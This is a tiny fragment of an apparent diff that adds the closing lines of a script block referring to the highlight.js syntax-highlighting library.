+},"highlightjs")
+</script>
 
 
 
